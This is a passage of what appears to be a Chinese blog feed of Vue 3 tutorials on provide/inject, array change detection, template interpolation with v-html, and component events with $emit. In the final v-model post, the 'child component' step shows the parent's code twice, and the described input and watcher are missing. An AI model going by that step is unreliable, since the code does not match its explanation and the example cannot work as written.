&#123;<span class="type">Object</span>&#125; 返回一个对象，其中包含要提供的数据属性</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   */</span></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">provide</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 提供的 message 属性，其值为当前组件的 message 属性值</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="variable language_">this</span>.<span class="property">message</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>祖宗<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Parent</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注入会在组件自身的状态之前被解析，因此你也可以在data()中访问到注入的属性：<br>Child.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">inject</span>: [<span class="string">&quot;message&quot;</span>],</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * 组件的初始数据函数</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   *</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * 该函数用于定义和初始化组件的数据属性在这里，我们创建了一个名为 `fullMessage` 的数据属性，</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * 它的初始值来源于组件的 `message` 属性这样做是为了在组件内部维护一个独立于原始 `message` 属性的副本，</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * 以便在不改变原始数据的情况下进行操作或展示</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   */</span></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">fullMessage</span>: <span class="variable language_">this</span>.<span class="property">message</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>子组件<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; fullMessage &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>除了在一个组件中提供依赖，我们还可以在整个应用层面提供依赖:<br>main.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createApp&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"><span class="comment">// 提供一个全局数据项，键名为 &#x27;golabDate&#x27;，值为 &#x27;我是全局数据&#x27;</span></span><br><span class="line">app.<span class="title function_">provide</span>(<span class="string">&#x27;golabDate&#x27;</span>, <span class="string">&#x27;我是全局数据&#x27;</span>)</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>温馨提示</strong><br>provide和inject只能由上到下的传递，不能反向传递</p>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结九【Vue数组变化侦测】</title>
    <url>/cnblogs.github.io/p/ea13.html</url>
    <content><![CDATA[<p><strong>变更方法</strong><br>Vue 能够侦听应式数组的变更方法，并在它们被调用时触发相关的更新。这些变更方法包括：</p>
<ul>
<li>push()</li>
<li>pop()</li>
<li>shift()</li>
<li>unshift()</li>
<li>splice()</li>
<li>sort()</li>
<li>reverse()</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">names</span>: [<span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;wangwu&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">addListHandler</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 引起UI自动更新</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">names</span>.<span class="title function_">push</span>(<span class="string">&#x27;zhaoliu&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>数组变化侦听<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addListHandler&quot;</span>&gt;</span>添加数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(name, index) of names&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>替换一个数组</strong><br>变更方法，顾名思义，就是会对调用它们的原数组进行变更。相对地，也有一些不可变（immutable）方法，例如filter(),concat()和slice()，这些都不会更改原数组，而总是返回一个新数组。当遇到的是非变更方法时，我们需要将旧的数组替换为新的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">names</span>: [<span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;wangwu&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">addListHandler</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 引起UI自动更新</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// this.names.push(&#x27;zhaoliu&#x27;)</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 不会引起UI自动更新</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//this.names.concat([&#x27;zhaoliu&#x27;])</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//console.log(this.names)</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 如果想引起UI自动更新，需要赋值给names</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">names</span> = <span class="variable language_">this</span>.<span class="property">names</span>.<span class="title function_">concat</span>([<span class="string">&#x27;zhaoliu&#x27;</span>])</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">names</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>数组变化侦听<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addListHandler&quot;</span>&gt;</span>合并数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(name, index) of names&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结二【Vue模板语法-文本插值】</title>
    <url>/cnblogs.github.io/p/ff55.html</url>
    <content><![CDATA[<p><strong>基本写法</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">msg</span>: <span class="string">&quot;hello world&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>模板语法<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>使用JavaScript表达式</strong><br>每个绑定仅支持单一表达式，也就是一段能够被求值的JavaScript代码。一个简单的判断方法是是否可以合法地写在return后面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">number</span>: <span class="number">10</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">ok</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&quot;大家好&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>模板语法<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; number + 1 &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; ok ? &#x27;yes&#x27; : &#x27;no&#x27; &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>无效写法</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这是一个语句，而非表达式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; var a = 1 &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 条件控制也不支持，请使用三元表达式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; if (ok) &#123; return message &#125; &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>原始HTML</strong><br>双大括号将会将数据插值为纯文本，而不是HTML。若想插入HTML，你需要使用v-htmI指令</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">rawHtml</span>: <span class="string">&quot;&lt;a href=&#x27;https://www.baidu.com&#x27;&gt;百度&lt;/a&gt;&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>模板语法<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; rawHtml &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 按照下面方式写就可以了 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-html</span>=<span class="string">&quot;rawHtml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结二十【Vue组件事件】</title>
    <url>/cnblogs.github.io/p/dd9e.html</url>
    <content><![CDATA[<p><strong>组件事件</strong><br>在组件的模板表达式中，可以直接使用$emit方法触发自定义事件，触发自定义事件的目的是组件之间传递数据<br>我们来创建2个组件。父组件： ComponentEvent.vue,子组件：Child.vue<br>Child.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 子组件通过$emit触发父组件的自定义事件并传递数据</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// someEvent为自定义事件名，&quot;来自Child的数据&quot;为传递的数据</span></span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">clickEventHandle</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.$emit(<span class="string">&quot;someEvent&quot;</span>, <span class="string">&quot;来自Child的数据&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Child<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 点击按钮触发clickEventHandle方法，通过$emit传递数据给父组件 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;clickEventHandle&quot;</span>&gt;</span>传递数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ComponentEvent.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Child</span> <span class="keyword">from</span> <span class="string">&quot;./Child.vue&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 用于存储子组件传递的数据</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Child</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 接收子组件传递的数据</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// data为接收到的数据</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">getHandle</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">message</span>=data;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>组件事件<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 子组件监听someEvent事件，绑定getHandle方法处理数据 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Child</span> @<span class="attr">someEvent</span>=<span class="string">&quot;getHandle&quot;</span>/&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 显示接收到的数据 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>父元素：&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结二十一【Vue组件事件配合v-model使用】</title>
    <url>/cnblogs.github.io/p/69c1.html</url>
    <content><![CDATA[<p><strong>组件事件配合v-model使用</strong><br>如果是用户输入，我们希望在获取数据的同时发送数据配合v-model 来使用，帮助理解组件间的通信和数据绑定。</p>
<h3 id="第一步：创建子组件（SearchComponent-vue）"><a href="#第一步：创建子组件（SearchComponent-vue）" class="headerlink" title="第一步：创建子组件（SearchComponent.vue）"></a>第一步：创建子组件（SearchComponent.vue）</h3><p>这个组件用于处理用户的搜索输入，并将输入值传递给父组件。<br>✅ 功能说明：</p>
<ul>
<li>数据属性 search：在 [data()]中定义了一个名为 search 的数据属性，作为输入框的双向绑定。</li>
<li>使用 v-model：模板中的 <code>&lt;input type=&quot;text&quot; v-model=&quot;search&quot;&gt;</code> 实现了用户输入与 search 数据的同步。</li>
<li>监听器 [watch]：当 search 发生变化时，通过 $emit 触发一个名为 searchEvent 的自定义事件，并传入新的值。</li>
<li>输出事件 searchEvent：该事件允许父组件订阅并接收子组件的数据更新。</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">SearchComponent</span> <span class="keyword">from</span> <span class="string">&#x27;./SearchComponent.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">SearchComponent</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">search</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">getSearch</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">search</span> = data</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Main<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>搜索内容 &#123;&#123; search &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">SearchComponent</span> @<span class="attr">searchEvent</span>=<span class="string">&quot;getSearch&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="第二步：创建主组件（Main-vue）"><a href="#第二步：创建主组件（Main-vue）" class="headerlink" title="第二步：创建主组件（Main.vue）"></a>第二步：创建主组件（Main.vue）</h3><p>这个组件负责显示来自子组件的数据，并展示到页面上。<br>✅ 功能说明：</p>
<ul>
<li>引入子组件：使用 import SearchComponent from ‘.&#x2F;SearchComponent.vue’ 引入子组件。</li>
<li>注册组件：在 [components]属性中注册 SearchComponent。</li>
<li>数据属性 search：用来保存从子组件接收到的搜索内容。</li>
<li>方法 getSearch(data)：响应子组件发出的 searchEvent 事件，将数据赋值给 this.search。</li>
<li>模板渲染：使用插值表达式  显示当前搜索内容，并通过 @searchEvent&#x3D;”getSearch” 监听子组件的事件。</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">SearchComponent</span> <span class="keyword">from</span> <span class="string">&#x27;./SearchComponent.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">SearchComponent</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">search</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">getSearch</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">search</span> = data</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Main<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>搜索内容 &#123;&#123; search &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">SearchComponent</span> @<span class="attr">searchEvent</span>=<span class="string">&quot;getSearch&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="第三步：运行项目"><a href="#第三步：运行项目" class="headerlink" title="第三步：运行项目"></a>第三步：运行项目</h3><p>确保你的项目结构如下：<br>src&#x2F;<br>├── components&#x2F;<br>│   ├── SearchComponent.vue<br>│   └── Main.vue<br>├── App.vue<br>└── main.js<br>修改 [App.vue]：</p>
